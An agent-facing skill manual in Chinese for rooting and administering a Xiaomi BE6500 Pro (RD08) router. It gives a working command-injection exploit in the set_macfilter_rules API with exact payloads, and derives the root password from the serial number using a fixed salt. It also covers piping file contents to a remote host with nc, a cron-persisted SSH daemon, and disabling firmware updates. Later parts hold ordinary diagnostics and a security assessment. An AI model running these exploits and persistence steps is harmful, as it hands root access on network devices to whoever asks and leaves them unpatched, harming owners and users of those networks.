---
name: xiaomi-rd08-control
description: Operate a Xiaomi BE6500 Pro (RD08) router over its local Web API and SSH — get a root shell via the set_macfilter_rules command injection, run read-only diagnostics (per-device traffic, temperatures, WiFi error rates, conntrack, kernel logs), disable OTA updates, and make SSH survive reboots. Includes the exact login hash, root password derivation from SN, all known traps, and API endpoints that require no auth.
whenToUse: The user asks to SSH into / inspect / monitor / reconfigure a Xiaomi BE6500 Pro (RD08) router, wants per-device traffic or temperatures the Web UI hides, wants to disable Xiaomi auto-update, or needs a root shell that persists across reboots. Also when the router's SSH is dead after a reboot and needs re-enabling.
---

# 小米 BE6500 Pro (RD08) 控制手册

**实测环境**：RD08 / 固件 1.1.96 / 内核 5.4.213 aarch64 / 2026-11 验证通过。

这份文档给**不熟悉这台设备的 Agent** 用。按顺序读，照抄命令即可。

> ⚠️ **先读第 0 节**。前三件事做错会触发封禁或让路由器变砖。

---

## 0. 开工前必读

### 0.1 三个会导致失败或危险的点

| 坑 | 后果 | 规避 |
|---|---|---|
| **连续 4 次密码错误** | 路由器封禁登录，只能重启 | 先本地验证密码，再请求登录 |
| **用 `nmap -A` / 全端口扫描** | 小米入侵检测会封禁你的 IP，**切断 SSH** | 只用 `/dev/tcp` 单端口探测 |
| **`echo > /etc/crontabs/root`** | 覆盖出厂 12 条任务（日志轮转、NTP、温度保护） | 永远用 `>>` 追加或 `sed -i` 删除 |

### 0.2 三个必须理解的路径语义

```
/                squashfs  只读   ← /root、/usr/sbin 都写不了
/etc             tmpfs           ← 可写！但重启即失
/data            ubifs    可写   ← 唯一能持久化的地方
/etc/crontabs    bind-mount 到 /data/etc/crontabs  ← 写这里能跨重启
```

**所以**：
- 放公钥到 `/root/.ssh/` 会**静默失败**（只读），且 `&&` 链会短路
- 持久化的东西一律放 `/data/`
- crontab 是少数例外，它被 bind-mount 了

### 0.3 需要的凭据

| 凭据 | 怎么拿 |
|---|---|
| Web 管理密码 | 用户提供。**不是 WiFi 密码，不是小米账号** |
| 设备 SN | 免认证 API 直接返回（见 §2.1），或底部标签 |
| root 密码 | **由 SN 算出**，见 §3 |

---

## 1. 快速开始（3 步拿到 root shell）

```bash
# ① 算 root 密码（把 SN 换成实际的）
python3 -c "import hashlib; print(hashlib.md5(b'<SN>6d2df50a-250f-4a30-a5e6-d44fb0960aa0').hexdigest()[:8])"

# ② 登录拿 stok + 注入命令启动 dropbear（脚本见 §4 / §5）
python3 scripts/rd08.py boot

# ③ 登录
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.1.1
```

**那两个 `-o` 参数不能省**，原因见 §6 坑 3。

---

## 2. 无需认证的信息（登录前就能拿）

### 2.1 `init_info` — 最重要的免认证接口

```bash
curl -s http://192.168.1.1/cgi-bin/luci/api/xqsystem/init_info
```

**返回关键字段：**

| 字段 | 含义 |
|---|---|
| `hardware` | `RD08` |
| `romversion` | 固件版本，如 `1.1.96` |
| **`id`** | **SN，形如 `12345/A1B2C3D4E5F6`** ← 能算出 root 密码 |
| `model` | `xiaomi.router.rd08` |
| `displayName` | 显示名 |
| `inited` | 是否已配置 |
| `bound` | 是否绑定小米账号 |
| `mesh_nodes` | Mesh 子节点 |
| `newEncryptMode` | `1` = SHA-256，`0` = SHA-1 |
| `features` | 硬件能力（2.5G 口、WiFi7、USB…） |

**这一条就能确认设备身份，不需要任何密码。**

### 2.2 其他免认证探测

```bash
# 开放端口
for p in 22 23 53 80 443 8080; do
  timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/$p" 2>/dev/null && echo "$p OPEN"
done

# DNS 反查（小米固件内部代号）
dig @192.168.1.1 -x 192.168.1.1 +short     # → xiaoqiang.

# 管理页特征
curl -s http://192.168.1.1/ | grep -o "<title>.*</title>"
```

**注意**：80 / 443 / 8080 **都指向同一个 LuCI 管理页**，不是三个不同服务。

---

## 3. root 密码：从 SN 直接算出

固件首次开机时 `etc/init.d/system` 执行 `mkxqimage -I` 生成密码写入 `/etc/shadow`。

**算法**：`MD5(SN + 固定盐)` 的前 8 位十六进制。

```python
import hashlib
SN   = '12345/A1B2C3D4E5F6'                                  # 从 init_info 的 id 字段取
SALT = '6d2df50a-250f-4a30-a5e6-d44fb0960aa0'
root_pwd = hashlib.md5((SN + SALT).encode()).hexdigest()[:8]
```

**⚠️ 安全含义：SN 泄露 = root 密码泄露。** 底部标签不要外传。

**验证方法**（不要拿路由器当试验田）——登录后读 `/etc/shadow`，本地复现：

```bash
# 路由器上
grep '^root:' /etc/shadow
# → root:$1$L/3BEMUE$lKlJms0pq5r2fvTH5jeMB.:20604:0:99999:7:::

# 本地验证（salt 从上面提取）
openssl passwd -1 -salt 'L/3BEMUE' '<算出的密码>'
# 两者一致 = 密码正确
```

---

## 4. 登录获取 stok

### 4.1 密码算法

`newEncryptMode=1` 时用 SHA-256，否则 SHA-1：

```
nonce    = "0_" + 本机MAC + "_" + unix时间戳 + "_" + random(0,9999)
password = SHA256(nonce + SHA256(Web密码 + key))
```

**key 固件内硬编码：**

```
a2ffa5c9be07488bbb04a3a47d3c5f6a
```

**也可以从登录页直接抓**（更稳妥）：

```bash
curl -s http://192.168.1.1/cgi-bin/luci/web | grep -oE "key: '[a-f0-9]+'"
```

### 4.2 登录请求

```
POST /cgi-bin/luci/api/xqsystem/login
     username=admin&password=<hash>&logtype=2&nonce=<nonce>
```

成功返回：

```json
{"token":"f6e54cb3476516db73dfc7b94ceaa2b1","code":0,"url":"/cgi-bin/luci/;stok=..."
```

`token` 就是 stok。

### 4.3 后续 API 调用格式

```
GET/POST /cgi-bin/luci/;stok=<stok>/api/<endpoint>
```

**stok 每次登录都会变，不能复用。

**⚠️ 连续两条命令间隔太短（<1秒）可能返回 `{"code":401,"msg":"not auth"}`。** 不是密码错，是上一个会话还没释放。加重试或 sleep 1 即可。

---

## 5. 命令注入：唯一的 root 入口

### 5.1 漏洞接口

```
POST /cgi-bin/luci/;stok=<stok>/api/xqsystem/set_macfilter_rules
     mac=<合法MAC>&name=<载荷>&option=0&wan=
```

### 5.2 原理（三层防护全失效）

| 层 | 本应做 | 实际 |
|---|---|---|
| `XQSecureUtil.hackCheck` | 过滤 `` ` ; \| $ & `` 和换行 | **`name` 在白名单里，直接放行** |
| 控制器读参数 | 用带正则的 `formvalue` | 用了**不带正则**的 `formvalue("name")` |
| `XQFirewall.setMacFilter` | 转义后拼接 | 直接拼进 `os.execute()`，**以 root 执行** |

最终变成：

```sh
/usr/sbin/macfilter add black <mac> rulename=<你的载荷>
```

### 5.3 载荷规则

| 字符 | 可用 | 说明 |
|---|---|---|
| 换行 | ✅ | |
| 反引号 | ✅ | |
| `$( )` | ✅ | **推荐**，示例都用这个 |
| `\|` `&` | ✅ | |
| **`;`** | ❌ | 控制器按 `;` 拆分 mac/name，分号后内容被丢弃 |

**其他必要条件：**

- `option` 必须是 `0`（add）。`option=1`（del）且 MAC 不在表里 → **提前 return，不执行**
- `mac` 必须是合法格式且**不在现有过滤表中** → **每次用随机 MAC**
- 载荷用 `x$(cmd)y` 包起来，让 shell 替换后仍有合法参数结构

### 5.4 验证漏洞是否存在（只读，零痕迹）

**用计时法，不要抓包**（抓包要 root，且留痕迹）：

```python
# 基线
call(f'mac={MAC}&name=&option=1&wan=')          # del 不存在 → 提前返回，约 0.3s
call(f'mac={MAC}&name=normal&option=0&wan=')    # 正常添加，约 0.5s
call(f'mac={MAC}&name=&option=1&wan=')          # 清理

# 注入测试
t, _ = call(f'mac={MAC}&name=x%24(sleep%206)y&option=0&wan=')
# t ≈ 6.4s  → 漏洞成立
# t ≈ 0.4s  → 被过滤（该固件已打补丁）
```

**6.40 ≈ 6 + 0.4**，差值精确等于 sleep 秒数。**这比抓包干净。**

---

## 6. SSH：已知的四个坑

### 坑 1：hostkey 是 0 字节占位文件

固件里 `/etc/dropbear/dropbear_rsa_host_key` **存在但是空的**。`dropbear -R`（自动生成）遇到已存在文件**不会覆盖**，于是拿空 key 启动失败。

```sh
rm -f /etc/dropbear/dropbear_rsa_host_key      # ← 必须先删
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
```

### 坑 2：不能用 telnetd 抄近路

小米给 busybox 的 `telnetd` **打了补丁**，启动时检查：

```
/proc/xiaoqiang/ft_mode
/usr/share/xiaoqiang/xiaoqiang_version 的 CHANNEL=release
bdata get telnet_en / nvram get telnet_en
```

**闸门在二进制内部，改 `/etc/init.d/telnet` 无效。** 稳定版下除非 `telnet_en=1` 否则拒绝启动（实测手动执行 `telnetd -l /bin/ash` 后 23 端口仍不监听）。

**用 dropbear，它没有这个补丁。**

### 坑 3：OpenSSH 8.8+ 拒绝 SHA-1

路由器 dropbear 是 **v2017.75**，只支持 SHA-1 的 `ssh-rsa` hostkey。报错：

```
no matching host key type found. Their offer: ssh-rsa
```

**看起来像被拒绝，其实是客户端不同意算法。** 必须加：

```
-o HostKeyAlgorithms=+ssh-rsa
-o PubkeyAcceptedAlgorithms=+ssh-rsa
```

### 坑 4：分号会静默截断命令（最容易踩）

**载荷里的 `;` 会被控制器拆掉，分号后面的命令直接不执行，而且不报错。**

实测：

```python
# 这样写：t2 根本不会生成，但返回 code:0 看起来成功
exec('echo AAA > /tmp/t1.txt; echo BBB > /tmp/t2.txt')
```

**正确写法：**

```python
exec('echo AAA > /tmp/t1.txt && echo BBB > /tmp/t2.txt')
```

**串联命令一律用 `&&` 或 `||`，永远不要用 `;`。**

判断命令是否真的执行了：**看结果文件是否存在**，不要只看返回的 `{"code":0}`。

### 坑 5：命令回传看不到输出

通过注入执行命令**没有 stdout**。这样写是错的：

```sh
cat /etc/passwd; echo MARKER; ls /root | nc 192.168.1.100 9999
```

**管道只作用于最后一条命令**，前面的输出全进黑洞。正确写法：

```sh
{ echo "=== A ==="; cmd1; echo "=== B ==="; cmd2; } | nc <你的IP> <端口>
```

或写文件后 base64 回传（二进制安全）：

```sh
base64 /tmp/diag.txt | nc <你的IP> <端口>
```

---

## 7. 非交互 SSH 登录（脚本化）

本机若没有 `sshpass` / `paramiko`，用 `SSH_ASKPASS`：

```bash
#!/bin/sh
# askpass.sh
case "$1" in
  *assword*) echo '<root密码>' ;;
  *) echo '' ;;
esac
```

```bash
DISPLAY=:0 SSH_ASKPASS=/tmp/askpass.sh SSH_ASKPASS_REQUIRE=force \
setsid -w ssh -o PreferredAuthentications=password \
    -o NumberOfPasswordPrompts=1 -o StrictHostKeyChecking=no \
    -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    root@192.168.1.1 '命令'
```

**`setsid` 必不可少**，否则 OpenSSH 会改走 tty 提示。

**⚠️ `/tmp` 会被系统清理**（实测发生过）。把脚本放 `/data/ssh/` 或用户 home 下。

**公钥认证走不通**：`/root` 是只读 squashfs，`mkdir -p /root/.ssh` 静默失败。`/etc/dropbear/authorized_keys` 配合 `-s` 模式也未成功。**直接用密码认证。**

---

## 8. 用 SSH 能查什么（Web 界面看不到的）

### 8.1 系统与硬件

```sh
uname -a                                    # 内核版本、编译时间
cat /proc/sys/kernel/hostname               # 主机名 XiaoQiang
cat /proc/cmdline                           # 启动参数（看 A/B 槽位）
cat /proc/cpuinfo | grep -E "Features|CPU part"
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_{min,max,cur}_freq
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors
zcat /proc/config.gz | grep -E "^CONFIG_(PREEMPT|BPF|KALLSYMS)"
```

**实测 CPU 特性**：`fp asimd evtstrm aes pmull sha1 sha2 crc32 cpuid`
→ **有 AES/PMULL 硬件加速**（openssl 测出低速可能是没走加速路径）

### 8.2 温度（5 个传感器）

```sh
for f in /sys/class/thermal/thermal_zone*/temp; do
  echo "$(cat $(dirname $f)/type): $(($(cat $f)/1000))°C"
done
```

**实测**：`tsens_tz_sensor11~15`，空载 **67–68°C**。

### 8.3 每设备流量（需要 stok，不是 SSH）

SSH 里没有现成的 per-device 统计接口（`miwifi_xthostlog` 模块没暴露用户态入口）。**用 API**：

```
GET /cgi-bin/luci/;stok=<stok>/api/xqsystem/status
```

返回 `devStatistics[]`，每项含：

| 字段 | 含义 |
|---|---|
| `devname` | 设备名 |
| `download` / `upload` | **累计字节数** |
| `downspeed` / `upspeed` | 当前速率 |
| `maxdownloadspeed` | 峰值 |
| `online` | 在线秒数 |

`wanStatistics` 是整机累计。

**`misystem/devicelist` 的 `statistics` 字段全是 0，不要用它取流量。**

### 8.4 WiFi 质量

```sh
# 每个接口的错误计数（算错误率）
for i in wl0 wl1 wl17 wl13; do
  echo "$i: rx_err=$(cat /sys/class/net/$i/statistics/rx_errors) rx=$(cat /sys/class/net/$i/statistics/rx_packets)"
done

# 信道、带宽、功率
iw dev wl0 info
```

**实测基准**（可作健康判断）：

| 接口 | SSID | 错误率 | 评价 |
|---|---|---|---|
| `wl0` (5G 主) | Xiaomi Be6500 Pro | **0.06%** | 优秀 |
| `wl1` (2.4G 主) | Xiaomi Be6500 Pro | **6.28%** | 偏高 |
| `wl17` (IoT) | ..._IoT | 0.66% | 一般 |

**错误率 >1% 就该查信道冲突。**

### 8.5 WiFi 断连历史（日志里挖）

```sh
# 断连次数
grep -c "DISASSOC" /data/usr/log/messages.0

# 按设备统计
grep -oE 'sta_mac="[0-9a-f:]+"' /data/usr/log/messages.0 | sort | uniq -c | sort -rn

# 断连原因码分布
grep -oE 'reason="[0-9]+"' /data/usr/log/messages.0 | sort | uniq -c

# 信号强度分布
grep -oE 'rssi="-?[0-9]+"' /data/usr/log/messages.0 | sort -n | uniq -c
```

**reason 码对照**：

| 码 | 含义 |
|---|---|
| 0 | 正常断开 |
| 1 | 未指定 |
| 3 | 去认证 |
| **8** | **STA 主动离开**（设备自己走的，不是路由器踢的） |
| 6 | Class 2 frame from nonassociated |

### 8.6 其他

```sh
cat /proc/net/nf_conntrack | head          # 每条连接明细
cat /proc/sys/net/netfilter/nf_conntrack_count    # 当前/上限
iptables -L zone_wan_input -n -v           # WAN 侧防火墙最终规则
iptables -L -n -v | grep -c "^ACCEPT\|^DROP"     # 规则数
cat /proc/interrupts                        # 中断分布（看负载在哪个核）
cat /proc/net/softnet_stat                  # 软中断/丢包
lsmod                                       # 已加载模块（实测 241 个）
ls /lib/modules/$(uname -r)/                # 可用模块（实测 260 个 .ko）
dmesg | tail -30                            # 内核日志
```

### 8.7 无线接口全清单（容易漏）

```
wl0   Xiaomi Be6500 Pro       5G 主
wl1   Xiaomi Be6500 Pro       2.4G 主
wl16  ..._IoT_5G              IoT 5G
wl17  ..._IoT                 IoT 2.4G
wl13  <随机>_miwifi           ⚠️ 无加密配网热点
wl4/wl5  MiMesh_...           Mesh 回程
```

**`wl13` 的 SSID 是 `<hash>_miwifi`，`encryption='none'`、`hidden='1'`、`maxsta='20'`。这是小米 IoT 配网通道，任何米家设备扫到都能连。** 实测发现有陌生设备通过它蹭网（`br-miot` 网段 192.168.32.x）。

---

## 9. 关闭自动更新

### 9.1 两条独立通道

| 通道 | 位置 | 说明 |
|---|---|---|
| Web/米家开关 | `otapred.settings.auto` | 只影响界面触发的 |
| **出厂 crontab** | `1 3,4,5 * * * /usr/sbin/otapredownload` | **每天凌晨真正偷更新的** |

### 9.2 操作

```sh
# ① UCI 开关
uci set otapred.settings.auto=0
uci commit otapred

# ② 删 crontab 行（只删这一行！）
cp /etc/crontabs/root /data/crontab.backup.$(date +%Y%m%d)
sed -i '/otapredownload/d' /etc/crontabs/root

# ③ 重启 cron
/etc/init.d/cron restart || killall crond; /usr/sbin/crond -c /etc/crontabs -b
```

### 9.3 验证

```sh
uci get otapred.settings.auto                    # 0
grep -c otapredownload /etc/crontabs/root        # 0
ps | grep -E "otapred|checkupgrade" | grep -v grep   # 应无输出
```

### 9.4 可选：DNS 层封锁（最后保险）

```sh
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci add_list dhcp.@dnsmasq[0].address='/cdn.cnbj1.fds.api.mi-img.com/0.0.0.0'
uci commit dhcp && /etc/init.d/dnsmasq restart
```

**代价**：以后想主动升级要先撤销。

### 9.5 `miio_auto_ota` 不用管

`ps` 里会看到 `/usr/bin/miio_auto_ota`，**它只在 Docker 容器内运行，更新的是中枢网关容器本身，不碰固件。**

```sh
# 确认它不在宿主机
ls /usr/bin/miio_auto_ota     # → No such file（宿主机上没有）
find / -name miio_auto_ota    # → 只在 /data/other/docker/overlay2/... 下
```

---

## 10. SSH 持久化（重启不丢）

### 10.1 原理

`/etc` 是 tmpfs，重启清空。`/data` 是 ubifs，能持久。`/etc/crontabs` bind-mount 到 `/data/etc/crontabs`，写 crontab 能跨重启。

### 10.2 三步

```sh
# ① 固化 hostkey
mkdir -p /data/ssh
cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key
chmod 600 /data/ssh/host_key

# ② 启动脚本
cat > /data/ssh/boot.sh <<'EOF'
#!/bin/sh
mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
netstat -ltn 2>/dev/null | grep -q ":22 " || /usr/sbin/dropbear -p 22
EOF
chmod 755 /data/ssh/boot.sh

# ③ 追加 crontab（不要覆盖！）
echo '* * * * * /data/ssh/boot.sh' >> /etc/crontabs/root
/etc/init.d/cron restart
```

**脚本有幂等性设计**（`grep -q ":22 "`），cron 每分钟跑一次不会起重复进程。

### 10.3 验证方法

**不要真重启**。更严苛的测法是彻底杀进程：

```sh
killall dropbear
# 你的 SSH 会断开，等 cron 每分钟拉一次
# 实测 10 秒内恢复
```

### 10.4 建议绑定到 LAN

默认 `dropbear -p 22` 监听 `0.0.0.0`，**包括 WAN 口**。

```sh
# boot.sh 里改成
/usr/sbin/dropbear -p 192.168.1.1:22
```

虽然小米防火墙默认拦截 WAN 入站（`zone_wan_input` 最后是 `zone_wan_src_REJECT`），但不要依赖它。

---

## 11. 网络拓扑

这台设备常被当作**二级路由**使用。典型拓扑：

```
公网
  ↓
运营商 CGNAT (10.100.x.x)        ← 注意：可能没有公网 IP
  ↓
上游路由 (192.168.0.1)
  ↓
BE6500 Pro WAN: 192.168.0.100    ← 由上游 DHCP 分配
BE6500 Pro LAN: 192.168.1.1
  ↓
br-miot: 192.168.32.1            ← IoT 隔离网段
```

**判断公网可达性**：

```sh
ip -4 addr show eth1.4 | grep inet     # WAN 是私有地址 = 多层 NAT
```

**实测结论**：四层阻断（CGNAT + 两层 NAT + 防火墙），**公网无法访问 22 端口**。

**查看是否有端口转发**：

```sh
uci show firewall | grep -i redirect     # 无输出 = 没有转发
ps | grep [m]iniupnpd                    # 无输出 = UPnP 未运行
```

---

## 12. 常用只读 API 端点

**都需要 stok**（除 `init_info`）：

| 端点 | 返回 |
|---|---|
| `xqsystem/init_info` | **免认证**，设备身份 |
| `xqsystem/status` | 整机流量 + **每设备累计流量** + uptime |
| `misystem/devicelist` | 设备列表（含在线时长、当前速率） |
| `xqnetwork/wan_info` | WAN 类型、IP、网关、DNS |
| `xqnetwork/wifi_detail_all` | 所有 SSID、信道、**明文密码** |
| `misystem/status` | 设备统计（与 status 有重叠） |

**不存在的端点**（会返回 `No page is registered`）：

```
xqsystem/sys_status
misystem/meminfo
misystem/sys_info
```

---

## 13. 恢复与撤销

### 13.1 关闭 SSH

```sh
killall dropbear
rm -f /etc/dropbear/dropbear_rsa_host_key
rm -rf /data/ssh
sed -i '\|/data/ssh/boot.sh|d' /etc/crontabs/root
/etc/init.d/cron restart
```

### 13.2 恢复自动更新

```sh
uci set otapred.settings.auto=1 && uci commit otapred
cp /data/crontab.backup.* /etc/crontabs/root    # 用备份
/etc/init.d/cron restart
```

### 13.3 固件回退

**A/B 双分区**，`/proc/cmdline` 能看当前槽位：

```
ubi.mtd=rootfs_1 ...     ← 从 mtd20 启动
```

**最稳的回退方式是 Web 后台上传官方固件**。命令行方式：

```sh
scp miwifi_rd08_firmware_*.bin root@192.168.1.1:/tmp/rom.bin
ssh root@192.168.1.1 '/sbin/sysupgrade --test /tmp/rom.bin'   # 先 dry-run
ssh root@192.168.1.1 '/sbin/sysupgrade /tmp/rom.bin'
```

**降级到更老版本通常会被拒绝**，需用 MIWIFIRepairTool 强刷。

---

## 14. 安全现状（诚实评估）

**这台设备的真实风险面：**

| 风险 | 等级 | 说明 |
|---|---|---|
| 公网访问 SSH | **无** | 四层 NAT + 防火墙 |
| 同 LAN 访问 SSH | **有** | 我进来的方式 |
| 上游网段访问 | 未知 | 取决于上游防火墙 |
| **Web 管理密码泄露** | **最高** | **拿到即可注入拿 root，与 SSH 无关** |
| SN 泄露 | 高 | 可推算 root 密码 |
| `wl13` 开放热点 | 低 | 陌生 IoT 设备可接入（隔离网段） |

**核心事实：漏洞风险与"有没有开 SSH"无关。** 关掉 dropbear 不会消除注入点。

**建议优先级**：换管理密码 > 换 root 密码 > 绑 SSH 到 LAN。

---

## 15. 危险操作清单（会变砖）

| 操作 | 后果 |
|---|---|
| 写 `/dev/mtd0` ~ `/dev/mtd15` | 引导链损坏，**直接变砖** |
| 擦除 `mtd16`（ART） | 无线校准丢失，**官方固件补不回** |
| 擦除 `mtd21`（bdata） | SN/MAC/密钥丢失，**永久报废** |
| `nvram commit` 改 bootargs | 可能无法启动 |
| 覆盖 `/etc/crontabs/root` | 丢失 12 条出厂任务 |

**任何写 flash 操作前，先完成全分区备份**（见仓库 `firmware/` 目录）。

---

## 16. 相关文件

| 路径 | 内容 |
|---|---|
| `README.md` | 完整教程（含原理解析、更多细节） |
| `firmware/` | 28 个分区备份（516MB） |
| `official_firmware/` | 官方 1.1.96 完整固件包（含 MD5） |
| `skill/scripts/` | 本文档配套脚本 |

**官方固件 MD5**：`ca00edece4618f905ee43635292708c2`
